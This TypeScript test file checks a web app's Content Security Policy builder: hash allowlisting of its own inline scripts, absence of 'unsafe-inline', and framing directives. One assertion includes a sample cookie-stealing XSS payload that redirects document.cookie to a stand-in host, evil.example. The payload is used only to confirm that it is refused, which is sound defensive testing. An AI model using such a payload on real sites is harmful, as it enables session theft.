import { describe, it, expect } from 'vitest';
import { createHash } from 'node:crypto';
import { buildAppCsp } from './appCsp.js';
import { THEME_TOGGLE_SCRIPT } from './pageShell.js';
import { PLAYER_SCRIPT } from './playgroundPages.js';

// The CSP source expression a browser computes for an inline script with this body. Computed here
// independently of the module under test (raw node:crypto, not appCsp's own helper) so the assertion
// is a genuine cross-check of the "which scripts may run" contract, not a tautology against the impl.
const hashOf = (body: string): string => `'sha256-${createHash('sha256').update(body, 'utf8').digest('base64')}'`;

// The gap R1 backstop: the app-origin script-src must admit exactly the app's own static inline
// scripts and refuse everything else — so an injected inline script cannot run on the origin holding
// the session credential. These assert that admit/reject contract directly on the derived policy,
// which is the verbatim string the harden() seal puts on every app-origin response.
describe('buildAppCsp', () => {
  it('admits the front-door page script and the shell/player module scripts, and rejects an injected one', () => {
    const frontDoor = "console.log('front door boot')";
    const csp = buildAppCsp(`<!doctype html><script>${frontDoor}</script>`);

    // Every script the app actually serves is admitted: the page's own inline script, plus the two
    // module scripts the shell and player emit (imported as the real constants they render).
    expect(csp).toContain(hashOf(frontDoor));
    expect(csp).toContain(hashOf(THEME_TOGGLE_SCRIPT));
    expect(csp).toContain(hashOf(PLAYER_SCRIPT));

    // An injected inline script — the concrete R1 threat — has a different body, so a different hash,
    // so it is NOT in the allowlist and the browser refuses it.
    expect(csp).not.toContain(hashOf("document.location='https://evil.example/?c='+document.cookie"));

    // No blanket escape hatch: listing hashes without 'unsafe-inline' (and with no host source) is
    // what makes the allowlist closed rather than advisory.
    expect(csp).toContain('script-src');
    expect(csp).not.toContain("'unsafe-inline'");
  });

  it('keeps the sandbox-bci.3 framing/injection directives alongside the derived script-src', () => {
    const csp = buildAppCsp('<!doctype html>');
    expect(csp).toContain("frame-ancestors 'self'");
    expect(csp).toContain("base-uri 'none'");
    expect(csp).toContain("form-action 'self'");
    expect(csp).toContain("object-src 'none'");
  });

  it('collapses identical script bodies to a single hash (the two theme resolvers)', () => {
    const body = "document.documentElement.setAttribute('data-theme','dark')";
    const csp = buildAppCsp(`<script>${body}</script><script>${body}</script>`);
    const occurrences = csp.split(hashOf(body)).length - 1;
    expect(occurrences).toBe(1);
  });
});
